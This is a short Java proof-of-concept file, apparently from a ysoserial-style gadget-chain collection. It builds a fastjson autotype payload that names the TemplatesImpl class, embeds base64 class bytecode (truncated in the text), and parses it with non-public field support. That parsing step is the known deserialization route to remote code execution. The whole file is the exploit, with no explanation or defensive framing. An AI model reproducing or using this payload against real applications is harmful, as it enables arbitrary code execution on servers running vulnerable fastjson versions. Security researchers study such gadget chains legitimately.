package ysoserial.payloads.tabbyGadgetChains.Jdk8;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;

public class Poc5 {
    public static void main(String[] args) {
        String jsonString = "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"," +
                "\"_name\":\"goodjob\",\"_tfactory\":{}," +
                "\"_bytecodes\":[\"yv66vgAAADQAOgoAA...\"]," +
                "\"_outputProperties\":null}";
        JSON.parseObject(jsonString, Feature.SupportNonPublicField);
    }
}


